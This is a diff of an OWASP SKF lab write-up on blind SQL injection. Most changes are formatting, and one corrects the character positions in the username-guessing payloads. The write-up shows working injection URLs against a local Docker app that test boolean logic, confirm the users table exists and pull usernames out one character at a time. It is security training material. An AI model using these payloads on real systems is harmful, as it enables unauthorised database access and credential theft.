@@ -14,7 +14,7 @@ $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:sql-inject
 Now that the app is running let's go hacking!
 {% endhint %}
 
-![Docker image and write-up thanks to ING!](.gitbook/assets/ING_Primary_Logo.png)
+![Docker image and write-up thanks to ING!](.gitbook/assets/ing_primary_logo.png)
 
 ## Reconnaissance
 
@@ -38,11 +38,11 @@ Now let's see if we can create an error by injecting a single quote
 http://localhost:5000/home/1'
 ```
 
-However, it's still not possile  we can't see this as the application shows a 404 Error page. 
+However, it's still not possile we can't see this as the application shows a 404 Error page.
 
 ### Step3
 
-Now we need to inject logic operators to check if the application is vulnerable to SQL Injection.  
+Now we need to inject logic operators to check if the application is vulnerable to SQL Injection.
 
 First, we inject a logical operator which is true \(or 1=1\). This should result in the application run as intended without errors.
 
@@ -52,7 +52,7 @@ First, we inject a logical operator which is true \(or 1=1\). This should result
 http://localhost:5000/home/1 OR 1=1
 ```
 
-After that we inject a logical operator which is false\ (and 1=2\). This should result in the application returning an error.
+After that we inject a logical operator which is false \(and 1=2\). This should result in the application returning an error.
 
 ![](.gitbook/assets/sqli-blind-4.png)
 
@@ -100,67 +100,67 @@ http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
 
 #### Step 3
 
-Next step is to add more logic to our injection and starting to retrieve information from data tables. Remember we will never view the data we are retrieving from the DB in the page, but we will do it by logicaly testing if the data exists. 
+Next step is to add more logic to our injection and starting to retrieve information from data tables. Remember we will never view the data we are retrieving from the DB in the page, but we will do it by logicaly testing if the data exists.
 
 Let's check if the table users exists.
 
 ![](.gitbook/assets/sqli-blind-9.png)
 
-```textile
+```text
 http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
 ```
 
-Good news! As we didn't see an error, it means the table *users* exists.
+Good news! As we didn't see an error, it means the table _users_ exists.
 
 By testing different table names, we will receive an 404 error, indicating the table does not exist.
 
-![](.gitbook/assets/sqli-blind-8.png) 
+![](.gitbook/assets/sqli-blind-8.png)
 
 ### Step 4
 
-From the *user* table is possible to see that the table contains the columns *UserId* , *UserName* and *Password*
+From the _user_ table is possible to see that the table contains the columns _UserId_ , _UserName_ and _Password_
 
 ![](.gitbook/assets/sqli-blind-10.png)
 
-Let's try to extract a valid user. Instead of having a dictionary of possible users to guess, we can check if the first letter of the first user contains the letter *a*.
+Let's try to extract a valid user. Instead of having a dictionary of possible users to guess, we can check if the first letter of the first user contains the letter _a_.
 
 ![](.gitbook/assets/sqli-blind-11.png)
 
-```textile
+```text
 http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
 ```
 
-The error indicates it's not the case. Let's try with the letter *A*. Remember, case matters.
+The error indicates it's not the case. Let's try with the letter _A_. Remember, case matters.
 
 ![](.gitbook/assets/sqli-blind-12.png)
 
-```
+```text
 http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
 ```
 
 Yes, it matches!
 
-As initial guess, *Admin* could be a possible user. So, let's test this theory:
+As initial guess, _Admin_ could be a possible user. So, let's test this theory:
 
-```
-http://localhost:5000/home/(select case when substr(UserName,1,1)='d' then 1 else 4 end from users limit 0,1)
-```
-
-```
-http://localhost:5000/home/(select case when substr(UserName,1,1)='m' then 1 else 4 end from users limit 0,1)
+```text
+http://localhost:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
 ```
 
-```
-http://localhost:5000/home/(select case when substr(UserName,1,1)='i' then 1 else 4 end from users limit 0,1)
-```
-
-```
-http://localhost:5000/home/(select case when substr(UserName,1,1)='n' then 1 else 4 end from users limit 0,1)
+```text
+http://localhost:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
 ```
 
-We made it! None of the requests above returned *404 Error*, so this indicates *Admin* is a valid value.
+```text
+http://localhost:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
+```
 
-Now that you know the logic, you can extract  all UserNames stored within this table. 
+```text
+http://localhost:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
+```
+
+We made it! None of the requests above returned _404 Error_, so this indicates _Admin_ is a valid value.
+
+Now that you know the logic, you can extract all UserNames stored within this table.
 
 Why not dumping the whole database?
 
@@ -174,4 +174,5 @@ Please refer to the OWASP testing guide for a full complete description about SQ
 
 SQLite Reference
 
-https://www.techonthenet.com/sqlite/sys_tables/index.php
+[https://www.techonthenet.com/sqlite/sys\_tables/index.php](https://www.techonthenet.com/sqlite/sys_tables/index.php)
+
